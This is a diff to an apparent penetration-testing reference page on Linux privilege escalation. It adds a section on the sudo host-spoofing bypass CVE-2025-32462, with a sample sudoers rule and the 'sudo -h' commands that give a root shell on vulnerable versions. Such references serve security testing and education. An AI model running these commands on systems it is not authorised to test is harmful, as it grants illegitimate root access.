@@ -100,6 +100,31 @@ Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit th
 
 For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
 
+### Sudo host-based rules bypass (CVE-2025-32462)
+
+Sudo before 1.9.17p1 (reported affected range: **1.8.8–1.9.17**) can evaluate host-based sudoers rules using the **user-supplied hostname** from `sudo -h <host>` instead of the **real hostname**. If sudoers grants broader privileges on another host, you can **spoof** that host locally.
+
+Requirements:
+- Vulnerable sudo version
+- Host-specific sudoers rules (host is neither the current hostname nor `ALL`)
+
+Example sudoers pattern:
+
+```
+Host_Alias     SERVERS = devbox, prodbox
+Host_Alias     PROD    = prodbox
+alice          SERVERS, !PROD = NOPASSWD:ALL
+```
+
+Exploit by spoofing the allowed host:
+
+```bash
+sudo -h devbox id
+sudo -h devbox -i
+```
+
+If resolution of the spoofed name blocks, add it to `/etc/hosts` or use a hostname that already appears in logs/configs to avoid DNS lookups.
+
 #### sudo < v1.8.28
 
 From @sickrov
@@ -2157,5 +2182,6 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 - [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
 - [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
 - [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
+- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
 
 {{#include ../../banners/hacktricks-training.md}}
